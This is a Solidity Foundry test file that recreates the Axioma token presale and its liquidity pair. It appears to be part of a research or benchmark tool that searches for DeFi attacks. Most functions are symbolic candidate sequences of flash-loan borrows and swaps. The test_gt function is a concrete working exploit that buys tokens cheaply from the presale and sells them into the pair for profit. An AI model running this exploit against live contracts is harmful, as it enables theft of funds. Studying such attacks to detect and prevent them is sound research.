// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {AxiomaPresale} from "./AxiomaPresale.sol";
import {Axioma} from "./Axioma.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WBNB} from "@utils/WBNB.sol";

contract AxiomaTest is Test, BlockLoader {
    WBNB wbnb;
    Axioma axt;
    UniswapV2Pair pair;
    AxiomaPresale axiomaPresale;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address wbnbAddr;
    address axtAddr;
    address pairAddr;
    address axiomaPresaleAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1682316206;
    uint112 reserve0pair = 14157668659303833605910;
    uint112 reserve1pair = 135484087470763777599;
    uint32 blockTimestampLastpair = 1682282924;
    uint256 kLastpair = 1906756385124960529232642104097337455670834;
    uint256 price0CumulativeLastpair = 162381479393497589138817955145076787665;
    uint256 price1CumulativeLastpair =
        6858833427654604253311640316527161756879863;
    uint256 totalSupplywbnb = 2523198357460087879090449;
    uint256 balanceOfwbnbpair = 135484087470763777599;
    uint256 balanceOfwbnbaxiomaPresale = 0;
    uint256 balanceOfwbnbattacker = 0;
    uint256 totalSupplyaxt = 1000000000000000000000000000;
    uint256 balanceOfaxtpair = 14157668659303833605910;
    uint256 balanceOfaxtaxiomaPresale = 9999996160000000000000000;
    uint256 balanceOfaxtattacker = 0;

    function setUp() public {
        owner = address(this);
        wbnb = new WBNB();
        wbnbAddr = address(wbnb);
        axt = new Axioma();
        axtAddr = address(axt);
        axiomaPresale = new AxiomaPresale(
            address(axt),
            address(this),
            300 * 10 ** 9,
            1
        );
        axiomaPresaleAddr = address(axiomaPresale);
        pair = new UniswapV2Pair(
            address(axt),
            address(wbnb),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        wbnb.transfer(address(pair), balanceOfwbnbpair);
        axt.transfer(address(pair), balanceOfaxtpair);
        axt.transfer(address(axiomaPresale), balanceOfaxtaxiomaPresale);
        axt.enableTrading();
        axt.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Wbnb Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(wbnb),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(axt), address(wbnb), axt.decimals());
        emit log_string("");
        emit log_string("Axt Balances: ");
        queryERC20BalanceDecimals(address(wbnb), address(axt), wbnb.decimals());
        queryERC20BalanceDecimals(address(axt), address(axt), axt.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(pair),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(address(axt), address(pair), axt.decimals());
        emit log_string("");
        emit log_string("Axiomapresale Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(axiomaPresale),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(axt),
            address(axiomaPresale),
            axt.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(wbnb),
            address(attacker),
            wbnb.decimals()
        );
        queryERC20BalanceDecimals(
            address(axt),
            address(attacker),
            axt.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return wbnb.balanceOf(attacker) >= 1e18 + balanceOfwbnbattacker;
    }

    function borrow_wbnb_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_owner(uint256 amount) internal eurus {
        wbnb.transfer(owner, amount);
    }

    function borrow_axt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        axt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_axt_owner(uint256 amount) internal eurus {
        axt.transfer(owner, amount);
    }

    function borrow_wbnb_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_pair(uint256 amount) internal eurus {
        wbnb.transfer(address(pair), amount);
    }

    function borrow_axt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        axt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_axt_pair(uint256 amount) internal eurus {
        axt.transfer(address(pair), amount);
    }

    function borrow_wbnb_axiomaPresale(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(axiomaPresale));
        wbnb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_wbnb_axiomaPresale(uint256 amount) internal eurus {
        wbnb.transfer(address(axiomaPresale), amount);
    }

    function borrow_axt_axiomaPresale(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(axiomaPresale));
        axt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_axt_axiomaPresale(uint256 amount) internal eurus {
        axt.transfer(address(axiomaPresale), amount);
    }

    function swap_pair_attacker_axt_wbnb(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        axt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_wbnb_axt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_axiomaPresale_attacker_wbnb_axt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        wbnb.approve(address(axiomaPresale), amount);
        axiomaPresale.buyToken(amount, address(wbnb));
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_axiomaPresale_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        payback_axt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_axiomaPresale_attacker_wbnb_axt(amt5, amt6);
        payback_axt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_axiomaPresale_attacker_wbnb_axt(amt3, amt4);
        payback_axt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_axiomaPresale_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_wbnb_axt(amt5, amt6);
        payback_axt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_axiomaPresale(amt0);
        swap_pair_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        payback_wbnb_axiomaPresale(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_axt_axiomaPresale(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        payback_axt_axiomaPresale(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_axt_axiomaPresale(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_axiomaPresale_attacker_wbnb_axt(amt5, amt6);
        payback_axt_axiomaPresale(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_axt(amt5, amt6);
        swap_pair_attacker_axt_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        swap_axiomaPresale_attacker_wbnb_axt(amt5, amt6);
        swap_pair_attacker_axt_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_axiomaPresale_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_axt(amt5, amt6);
        swap_pair_attacker_axt_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_axiomaPresale_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        swap_axiomaPresale_attacker_wbnb_axt(amt5, amt6);
        swap_pair_attacker_axt_wbnb(amt7, amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_axt(amt7, amt8);
        payback_axt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_axt(amt7, amt8);
        swap_axiomaPresale_attacker_wbnb_axt(amt9, amt10);
        payback_axt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_axiomaPresale_attacker_wbnb_axt(amt7, amt8);
        payback_axt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_axiomaPresale_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_axt(amt7, amt8);
        payback_axt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_axiomaPresale_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_axiomaPresale_attacker_wbnb_axt(amt7, amt8);
        payback_axt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_axt_owner(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_axiomaPresale_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_axiomaPresale_attacker_wbnb_axt(amt7, amt8);
        swap_pair_attacker_wbnb_axt(amt9, amt10);
        payback_axt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_axiomaPresale(amt0);
        swap_pair_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_axt(amt5, amt6);
        swap_pair_attacker_axt_wbnb(amt7, amt8);
        payback_wbnb_axiomaPresale(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_axt_axiomaPresale(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_axt(amt7, amt8);
        payback_axt_axiomaPresale(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_axt_axiomaPresale(amt0);
        swap_pair_attacker_axt_wbnb(amt1, amt2);
        swap_pair_attacker_wbnb_axt(amt3, amt4);
        swap_pair_attacker_axt_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_axt(amt7, amt8);
        swap_axiomaPresale_attacker_wbnb_axt(amt9, amt10);
        payback_axt_axiomaPresale(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 32500 * 1e15);
        borrow_wbnb_owner(32500 * 1e15);
        printBalance("After step0 ");
        emit log_named_uint("amt1", 32500 * 1e15);
        emit log_named_uint("amt2", 1);
        swap_axiomaPresale_attacker_wbnb_axt(32500 * 1e15, 1);
        printBalance("After step1 ");
        emit log_named_uint("amt3", axt.balanceOf(attacker));
        emit log_named_uint("amt4", 33500 * 1e15);
        swap_pair_attacker_axt_wbnb(axt.balanceOf(attacker), 33500 * 1e15);
        printBalance("After step2 ");
        emit log_named_uint("amt5", 32500 * 1e15);
        payback_wbnb_owner(32500 * 1e15);
        printBalance("After step3 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_axiomaPresale_attacker_wbnb_axt(amt1, amt2);
        swap_pair_attacker_axt_wbnb(amt3, amt4);
        payback_wbnb_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
